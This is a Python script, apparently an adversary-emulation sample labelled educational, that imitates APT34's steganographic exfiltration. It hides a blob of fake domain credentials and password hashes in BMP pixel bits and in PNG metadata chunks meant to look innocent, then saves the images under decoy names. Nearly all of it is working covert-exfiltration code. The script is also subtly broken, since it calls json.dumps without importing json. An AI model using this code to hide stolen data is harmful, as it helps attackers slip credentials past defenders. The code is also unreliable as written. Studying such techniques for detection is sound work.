# Helix Kitten (APT34/OilRig) - Steganography Data Exfiltration
# Embeds stolen data within image files for covert exfiltration
# MITRE ATT&CK: T1027.003 (Steganography), T1041 (Exfiltration Over C2)

# For educational and research purposes only
# Author: Nour A
# Reference: https://research.checkpoint.com/2021/irans-apt34-returns/

import struct
import hashlib
import os
import sys
import zlib
import math
from io import BytesIO


def create_bmp_image(width, height, color=(200, 200, 200)):
    """Create a BMP image in memory for steganography carrier."""
    stride = ((width * 3 + 3) & ~3)
    img_size = stride * height
    file_size = 54 + img_size

    # BMP file header (14 bytes)
    header = struct.pack("<2sIHHI",
                         b"BM", file_size, 0, 0, 54)

    # DIB header (40 bytes)
    dib = struct.pack("<IiiHHIIiiII",
                      40, width, height, 1, 24, 0,
                      img_size, 2835, 2835, 0, 0)

    # pixel data
    pixels = bytearray(img_size)
    for y in range(height):
        for x in range(width):
            offset = y * stride + x * 3
            # BGR format
            pixels[offset] = color[2]      # B
            pixels[offset + 1] = color[1]  # G
            pixels[offset + 2] = color[0]  # R

    return header + dib + bytes(pixels)


def lsb_embed(carrier_data, secret_data, bits_per_channel=1):
    """Least Significant Bit steganography embedding.
    Hides data in the least significant bits of pixel values.
    APT34 uses this to exfiltrate data through innocent-looking images.
    """
    if not (1 <= bits_per_channel <= 4):
        raise ValueError("bits_per_channel must be 1-4")

    # compress and add length header
    compressed = zlib.compress(secret_data)
    payload = struct.pack("<I", len(compressed)) + compressed

    # convert payload to bit stream
    bits = []
    for byte in payload:
        for i in range(7, -1, -1):
            bits.append((byte >> i) & 1)

    # parse BMP header
    if carrier_data[:2] != b"BM":
        raise ValueError("Not a valid BMP file")

    pixel_offset = struct.unpack("<I", carrier_data[10:14])[0]
    width = struct.unpack("<i", carrier_data[18:22])[0]
    height = struct.unpack("<i", carrier_data[22:26])[0]

    pixel_data = bytearray(carrier_data[pixel_offset:])

    # calculate capacity
    capacity_bits = len(pixel_data) * bits_per_channel
    needed_bits = len(bits)

    if needed_bits > capacity_bits:
        raise ValueError(
            f"Image too small. Need {needed_bits} bits, "
            f"have {capacity_bits} bits capacity"
        )

    # mask for clearing LSBs
    mask = ~((1 << bits_per_channel) - 1) & 0xFF

    # embed bits into pixel LSBs
    bit_idx = 0
    for i in range(len(pixel_data)):
        if bit_idx >= len(bits):
            break

        # clear target bits
        pixel_data[i] &= mask

        # embed data bits
        value = 0
        for b in range(bits_per_channel):
            if bit_idx < len(bits):
                value |= bits[bit_idx] << (bits_per_channel - 1 - b)
                bit_idx += 1

        pixel_data[i] |= value

    # reconstruct image
    stego_image = carrier_data[:pixel_offset] + bytes(pixel_data)
    return stego_image


def lsb_extract(stego_data, bits_per_channel=1):
    """Extract hidden data from LSB steganography."""
    if stego_data[:2] != b"BM":
        raise ValueError("Not a valid BMP file")

    pixel_offset = struct.unpack("<I", stego_data[10:14])[0]
    pixel_data = stego_data[pixel_offset:]

    # extract bits
    bits = []
    for byte in pixel_data:
        for b in range(bits_per_channel - 1, -1, -1):
            bits.append((byte >> b) & 1)

    # convert bits to bytes
    extracted = bytearray()
    for i in range(0, len(bits) - 7, 8):
        byte = 0
        for j in range(8):
            byte |= bits[i + j] << (7 - j)
        extracted.append(byte)

    # read length header
    if len(extracted) < 4:
        return None

    data_len = struct.unpack("<I", bytes(extracted[:4]))[0]

    # decompress
    try:
        return zlib.decompress(bytes(extracted[4:4 + data_len]))
    except zlib.error:
        return None


def create_png_chunk(chunk_type, data):
    """Create a PNG chunk with CRC."""
    chunk = chunk_type + data
    crc = zlib.crc32(chunk) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + chunk + struct.pack(">I", crc)


def png_metadata_embed(secret_data, width=100, height=100):
    """Hide data in PNG tEXt chunks.
    An alternative steganography method using PNG metadata.
    """
    # PNG signature
    png = b"\x89PNG\r\n\x1a\n"

    # IHDR chunk
    ihdr_data = struct.pack(">IIBBBBB",
                            width, height,
                            8,  # bit depth
                            2,  # color type (RGB)
                            0,  # compression
                            0,  # filter
                            0)  # interlace
    png += create_png_chunk(b"IHDR", ihdr_data)

    # embed data in tEXt chunks (looks like normal metadata)
    compressed = zlib.compress(secret_data)
    encoded = __import__("base64").b64encode(compressed).decode()

    # split into multiple tEXt chunks to avoid suspicion
    chunk_size = 1024
    metadata_keys = [
        "Description", "Copyright", "Comment",
        "Software", "Author", "Source"
    ]

    for i in range(0, len(encoded), chunk_size):
        key_idx = (i // chunk_size) % len(metadata_keys)
        key = metadata_keys[key_idx]
        value = encoded[i:i + chunk_size]
        text_data = key.encode() + b"\x00" + value.encode()
        png += create_png_chunk(b"tEXt", text_data)

    # minimal IDAT chunk (1x1 pixel for valid PNG)
    raw_data = b"\x00" + b"\x00\x00\x00" * width  # filter byte + RGB
    compressed_pixels = zlib.compress(raw_data * height)
    png += create_png_chunk(b"IDAT", compressed_pixels)

    # IEND chunk
    png += create_png_chunk(b"IEND", b"")

    return png


def calculate_capacity(width, height, bits_per_channel=1, channels=3):
    """Calculate steganography capacity for given image dimensions."""
    total_pixels = width * height
    total_bits = total_pixels * channels * bits_per_channel
    total_bytes = total_bits // 8
    # subtract header overhead (4 bytes for length)
    usable_bytes = total_bytes - 4
    return {
        "pixels": total_pixels,
        "capacity_bits": total_bits,
        "capacity_bytes": total_bytes,
        "usable_bytes": usable_bytes,
        "usable_kb": usable_bytes / 1024
    }


def main():
    print("=" * 70)
    print("HELIX KITTEN (APT34) - STEGANOGRAPHY EXFILTRATION")
    print("Image-Based Covert Data Channel")
    print("=" * 70)
    print()
    print("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
    print()

    # Stage 1: Capacity analysis
    print("[STAGE 1] Steganography Capacity Analysis")
    print("-" * 50)
    for res in [(640, 480), (1024, 768), (1920, 1080), (3840, 2160)]:
        cap = calculate_capacity(res[0], res[1])
        print(f"  {res[0]}x{res[1]}: {cap['usable_kb']:.1f} KB "
              f"({cap['pixels']} pixels, {cap['capacity_bits']} bits)")
    print()

    # Stage 2: BMP LSB steganography
    print("[STAGE 2] BMP LSB Steganography")
    print("-" * 50)

    # create carrier image
    width, height = 200, 200
    carrier = create_bmp_image(width, height, color=(180, 140, 100))
    print(f"  Carrier: {width}x{height} BMP ({len(carrier)} bytes)")

    # secret data
    secret = json.dumps({
        "hostname": "TARGET-DC01",
        "credentials": [
            {"user": "admin", "hash": "aad3b435b51404eeaad3b435b51404ee"},
            {"user": "svc_backup", "hash": "e52cac67419a9a224a3b108f3fa6cb6d"},
        ],
        "domain": "CORP.EXAMPLE.COM",
        "dc_ip": "10.0.0.5"
    }).encode()
    print(f"  Secret data: {len(secret)} bytes")
    print(f"  SHA256: {hashlib.sha256(secret).hexdigest()[:32]}...")

    # embed
    stego = lsb_embed(carrier, secret, bits_per_channel=1)
    print(f"  Stego image: {len(stego)} bytes")

    # verify pixel impact
    diff_count = sum(1 for a, b in zip(carrier[54:], stego[54:]) if a != b)
    total_pixels = len(carrier[54:])
    print(f"  Modified pixels: {diff_count}/{total_pixels} "
          f"({100 * diff_count / total_pixels:.1f}%)")

    # extract and verify
    extracted = lsb_extract(stego, bits_per_channel=1)
    if extracted == secret:
        print(f"  Extraction: SUCCESS - data matches!")
    else:
        print(f"  Extraction: FAILED")
    print()

    # Stage 3: PNG metadata steganography
    print("[STAGE 3] PNG Metadata Steganography")
    print("-" * 50)
    png_stego = png_metadata_embed(secret, 100, 100)
    print(f"  PNG stego image: {len(png_stego)} bytes")
    print(f"  Data hidden in tEXt chunks")
    print(f"  Chunks look like normal image metadata")
    print()

    # Stage 4: Save demonstration files
    print("[STAGE 4] Saving Demonstration Files")
    print("-" * 50)
    temp = os.environ.get("TEMP", ".")

    bmp_path = os.path.join(temp, "profile_photo.bmp")
    with open(bmp_path, "wb") as f:
        f.write(stego)
    print(f"  BMP stego: {bmp_path} ({len(stego)} bytes)")

    png_path = os.path.join(temp, "company_logo.png")
    with open(png_path, "wb") as f:
        f.write(png_stego)
    print(f"  PNG stego: {png_path} ({len(png_stego)} bytes)")
    print()

    print("=" * 70)
    print("[+] STEGANOGRAPHY SIMULATION COMPLETE")
    print("  Techniques demonstrated:")
    print("  - BMP image creation for carrier generation")
    print("  - LSB embedding with zlib compression")
    print("  - LSB extraction and verification")
    print("  - PNG tEXt chunk data hiding")
    print("  - Capacity analysis for different resolutions")
    print("=" * 70)


if __name__ == "__main__":
    main()
